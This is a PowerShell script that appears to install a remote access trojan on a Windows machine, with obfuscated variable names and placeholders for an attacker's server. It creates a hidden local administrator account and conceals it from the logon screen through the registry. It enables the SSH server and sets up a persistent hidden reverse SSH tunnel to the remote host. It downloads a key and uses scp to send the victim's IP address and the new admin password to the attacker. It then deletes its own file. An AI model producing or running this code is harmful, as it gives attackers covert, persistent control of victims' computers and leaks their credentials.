# Define log file path
$logFilePath = "$env:USERPROFILE\Downloads\script_log.txt"

# Function to log messages
function Log-Message {
    param (
        [string]$Message
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] $Message"
    Add-Content -Path $logFilePath -Value $logEntry
}

# Start logging
Log-Message "Script execution started."

# Variables
$nkowFESgaO = "USERNAME" # change me, vps username
$ecPlmJVLRo = "X.X.X.X" # change me, vps ip address
$ENyMAhIrsb = "22" # change me, default vps port [default 22]
$YlEQgBmePn = "2583" # change me, routed vps port [NOT TO DEFAULT SSH PORT]

$dERQpoZWxz = "$nkowFESgaO@$ecPlmJVLRo"

function RpLGWiUsIy {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
}

function geIwCZloBx {
    [CmdletBinding()]
    param (
        [string] $sqbXFdLvyw,
        [securestring] $CBFXIYeWPR
    )    
    begin {
    }    
    process {
        try {
            New-LocalUser  "$sqbXFdLvyw" -Password $CBFXIYeWPR -FullName "$sqbXFdLvyw" -Description "Temporary local admin"
            Log-Message "$sqbXFdLvyw local user created"
            Add-LocalGroupMember -Group "Administrators" -Member "$sqbXFdLvyw"
            Log-Message "$sqbXFdLvyw added to the local administrator group"
        } catch {
            Log-Message "Error creating user or adding to group: $_"
        }
    }    
    end {
    }
}

# make admin
$sqbXFdLvyw = "onlyrat"
$DCilJFugpP = RpLGWiUsIy
try {
    Remove-LocalUser  -Name $sqbXFdLvyw -ErrorAction Stop
    Log-Message "Existing user $sqbXFdLvyw removed."
} catch {
    Log-Message "Error removing user $sqbXFdLvyw: $_"
}
$CBFXIYeWPR = (ConvertTo-SecureString $DCilJFugpP -AsPlainText -Force)
geIwCZloBx -sqbXFdLvyw $sqbXFdLvyw -CBFXIYeWPR $CBFXIYeWPR

# registry
$csfMFzvgEN = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
$jmQikqoKMZ = '00000000'

If (-NOT (Test-Path $csfMFzvgEN)) {
    try {
        New-ItemProperty -Path $csfMFzvgEN -Force | Out-Null
        Log-Message "Registry path $csfMFzvgEN created."
    } catch {
        Log-Message "Error creating registry path $csfMFzvgEN: $_"
    }
}

try {
    New-ItemProperty -Path $csfMFzvgEN -Name $sqbXFdLvyw -Value $jmQikqoKMZ -PropertyType DWORD -Force
    Log-Message "Registry entry for $sqbXFdLvyw created."
} catch {
    Log-Message "Error creating registry entry for $sqbXFdLvyw: $_"
}

# ssh
try {
    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
    Log-Message "OpenSSH Server capability added."
    Start-Service sshd
    Log-Message "SSH service started."
    Set-Service -Name sshd -StartupType 'Automatic'
    Log-Message "SSH service set to start automatically."
    New-Item -ItemType Directory -Path $env:USERPROFILE\.ssh -ErrorAction Stop
    Log-Message ".ssh directory created."
    ssh-keyscan.exe -H $ ecPlmJVLRo >> $env:USERPROFILE\.ssh\known_hosts
    Log-Message "SSH keyscan executed for $ecPlmJVLRo."
} catch {
    Log-Message "Error setting up SSH: $_"
}

# startup file
$GlNweBEFmh = RpLGWiUsIy
$NyZnoLKCIs = Get-Location
try {
    Add-Content -Path "$NyZnoLKCIs/$GlNweBEFmh.cmd" -Value "@echo off"
    Add-Content -Path "$NyZnoLKCIs/$GlNweBEFmh.cmd" -Value "powershell powershell.exe -windowstyle hidden -ep bypass `"ssh -o ServerAliveInterval=30 -o StrictHostKeyChecking=no -R $YlEQgBmePn`:localhost:22 $dERQpoZWxz -i $env:temp\key`""
    Log-Message "Startup file $GlNweBEFmh.cmd created."
} catch {
    Log-Message "Error creating startup file: $_"
}

# rat file
$CRYnrkaDbe = "$env:User Name.rat"
$AhdjktGyiZ = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress

try {
    Add-Content -Path $CRYnrkaDbe -Value $AhdjktGyiZ # local ip addr
    Add-Content -Path $CRYnrkaDbe -Value $DCilJFugpP # pass
    Add-Content -Path $CRYnrkaDbe -Value $env:temp # temp
    Add-Content -Path $CRYnrkaDbe -Value $NyZnoLKCIs # startup
    Add-Content -Path $CRYnrkaDbe -Value $ecPlmJVLRo # remote host
    Add-Content -Path $CRYnrkaDbe -Value $YlEQgBmePn # remote port
    Add-Content -Path $CRYnrkaDbe -Value 'remote' # connection type
    Log-Message "RAT file $CRYnrkaDbe created."
} catch {
    Log-Message "Error creating RAT file: $_"
}

# get key and send rat
try {
    Invoke-WebRequest -Uri "http://$ecPlmJVLRo/key" -OutFile "$env:temp\key"
    Log-Message "Key downloaded from $ecPlmJVLRo."
    scp -P $ENyMAhIrsb -o StrictHostKeyChecking=no -i $env:temp\key -r $CRYnrkaDbe $dERQpoZWxz`:/home/$nkowFESgaO
    Log-Message "RAT file sent to remote host."
} catch {
    Log-Message "Error downloading key or sending RAT file: $_"
}

# cleanup
try {
    Set-Location C:\Users
    attrib +h +s +r onlyrat 
    Set-Location $NyZnoLKCIs
    Remove-Item $CRYnrkaDbe -ErrorAction Stop
    Log-Message "RAT file $CRYnrkaDbe removed."
    Remove-Item KFPGaEYdcz.ps1 -ErrorAction Stop
    Log-Message "Script file KFPGaEYdcz.ps1 removed."
    start "./$GlNweBEFmh.cmd"
    Log-Message "Startup command executed."
} catch {
    Log-Message "Error during cleanup: $_"
}

Log-Message "Script execution completed."